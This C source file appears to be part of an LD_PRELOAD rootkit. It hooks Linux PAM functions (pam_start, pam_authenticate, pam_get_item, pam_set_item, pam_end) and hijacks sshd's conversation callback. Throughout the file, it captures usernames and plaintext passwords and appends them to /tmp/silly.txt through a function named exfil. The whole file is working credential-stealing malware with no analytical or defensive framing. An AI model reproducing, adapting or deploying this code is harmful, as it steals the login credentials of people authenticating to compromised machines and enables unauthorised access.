#include "father.h"

void exfil(int type, int result, const char * username, const char * password)
{
	FILE * fp = fopen("/tmp/silly.txt", "a+");
	fprintf(fp, "%d:%d:%s:%s\n", type, result, username, password);
	fclose(fp);
}

// stores old SSHD conversation function
int (*oldconv)(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr);

int newconv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {
    int res = 0;
    exfil(-7, -7, "in", "newconv");
    res = oldconv(num_msg, msg, resp, appdata_ptr);

    // grab the password
    //if (resp && resp[0] && resp[0]->resp) {
    if (res == PAM_SUCCESS) {
        if (resp[0]->resp_retcode == PAM_SUCCESS) {
            exfil(101, resp[0]->resp_retcode, "respcode", "yaababy");
        }
        exfil(100, num_msg, "password", resp[0]->resp);
    }

    return res;
}

int (*o_pam_start)(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh);
int pam_start(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh) {
    if (o_pam_start == NULL)
        o_pam_start = dlsym(RTLD_NEXT, "pam_start");

    struct pam_conv * myconv;
    myconv = pam_conversation;
    exfil(-2, -2, service_name, user);
    if (!strcmp(service_name, "sshd")) {
        // get the old conv function
        oldconv = myconv->conv;
        myconv->conv = newconv;
    }

    return o_pam_start(service_name, user, pam_conversation, pamh);
}


int (*o_pam_end)(pam_handle_t *pamh, int pam_status);
int pam_end(pam_handle_t *pamh, int pam_status) {
    int res;
    char * item;
    item = NULL;
    if (o_pam_end == NULL)
        o_pam_end = dlsym(RTLD_NEXT, "pam_end");

    if(o_pam_get_item == NULL) {
        o_pam_get_item = dlsym(RTLD_NEXT, "pam_get_item");
    }

    // get password
    res = o_pam_get_item(pamh, PAM_AUTHTOK, (const void **)&item);
    if (item == NULL || res != PAM_SUCCESS)
        exfil(-11, res, "pamend", "failed");
    if (res == PAM_SUCCESS && item)
        exfil(-10, -10, "pamend", item);

    return o_pam_end(pamh, pam_status);

}



int (*o_pam_get_item)(const pam_handle_t *, int, const void **);
int pam_get_item(const pam_handle_t * pamh, int item_type, const void ** item) {

    if(o_pam_get_item == NULL) {
        o_pam_get_item = dlsym(RTLD_NEXT, "pam_get_item");
    }

    int result;
    const char * username;

    result = o_pam_get_item(pamh, item_type, item);
    if (*item && item_type == 2 && result == 0) {
        pam_get_user((pam_handle_t *)pamh, &username, NULL);
        exfil(item_type, result, username, (const char *)*item);
    }
    return result;
}

int (*o_pam_set_item)(pam_handle_t *, int, const void *);
int pam_set_item(pam_handle_t * pamh, int item_type, const void * item) {
    int res;
    if(o_pam_set_item == NULL) {
        o_pam_set_item = dlsym(RTLD_NEXT, "pam_set_item");
    }

    if (item_type == PAM_AUTHTOK && item) {
        exfil(PAM_AUTHTOK, -14, "setitem", (char *)item);
    }


    res = o_pam_set_item(pamh, item_type, item);



    return res;
}

int (*o_pam_authenticate)(pam_handle_t *, int);
int pam_authenticate(pam_handle_t * pamh, int flags)
{
  int res = -1;
  struct pam_conv * myconv;


  if(o_pam_authenticate == NULL) {
    o_pam_authenticate = dlsym(RTLD_NEXT, "pam_authenticate");
  }

  //exfil(10, 10, "shid", "fug");

  // get the pam_conv

  res = pam_get_item(pamh, PAM_CONV, (const void**)&myconv);
  if (res != PAM_SUCCESS) {

  }

  // hook the conversation function

  oldconv = myconv->conv;
  myconv->conv = newconv;


  if (o_pam_authenticate == NULL) return PAM_SUCCESS;
  res = o_pam_authenticate(pamh, flags);




  return res;
}



